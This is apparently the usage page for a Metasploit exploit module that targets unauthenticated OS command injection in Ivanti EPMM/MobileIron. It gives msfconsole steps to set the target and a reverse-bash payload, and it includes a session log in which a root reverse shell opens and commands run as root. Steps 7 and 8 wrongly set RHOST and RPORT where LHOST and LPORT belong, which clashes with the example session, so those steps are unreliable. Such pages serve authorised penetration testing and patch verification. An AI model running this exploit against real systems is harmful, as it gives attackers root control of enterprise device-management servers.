## Vulnerable Application
This module exploits a OS command injection issue in Ivanti Endpoint Manager Mobile (EPMM), formerly known
as MobileIron. A remote attacker can achieve unauthenticated RCE with root privileges on an affected device.

## Testing
The vendor has detailed installation guides [here](https://help.ivanti.com/mi/help/en_us/core/11.x/inst/OnPremiseInstallation/InstallCore.htm).
You can install MobileIron/EPMM as a VM using a ISO file (e.g. `mobileiron-12.5.0.1-13.iso`).

## Verification Steps

1. Start msfconsole
2. `use exploit/linux/http/ivanti_epmm_rce`

Configure the target:

3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_HTTP_OR_HTTPS_PORT>` (If different from the default of 443)
5. `set SSL true` (Or set to false if targeting HTTP)

Configure the payload to execute:

6. `set PAYLOAD cmd/unix/reverse_bash`
7. `set RHOST eth0`
8. `set RPORT 4444`

Run the module:

9. `check`
10. `exploit`

## Scenarios

### Example 1

```
msf > use exploit/linux/http/ivanti_epmm_rce 
[*] Using configured payload cmd/unix/reverse_bash
msf exploit(linux/http/ivanti_epmm_rce) > set RHOST 192.168.86.103
RHOST => 192.168.86.103
msf exploit(linux/http/ivanti_epmm_rce) > set LHOST eth0
LHOST => eth0
msf exploit(linux/http/ivanti_epmm_rce) > show options 

Module options (exploit/linux/http/ivanti_epmm_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, socks5, socks5h
   RHOSTS     192.168.86.103   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  eth0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Default



View the full module info with the info, or info -d command.

msf exploit(linux/http/ivanti_epmm_rce) > check
[+] 192.168.86.103:443 - The target is vulnerable. Detected Ivanti MobileIron version 11.2
msf exploit(linux/http/ivanti_epmm_rce) > exploit 
[*] Started reverse TCP handler on 192.168.86.122:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Detected Ivanti MobileIron version 11.2
[*] Command shell session 1 opened (192.168.86.122:4444 -> 192.168.86.103:48404) at 2026-02-05 12:15:07 +0000

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux mobileiron.fritz.box 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
pwd
/mi/bin
cat /mi/release
VSP 11.2.0.0 Build 31 (Branch core-11.2.0.0)
```
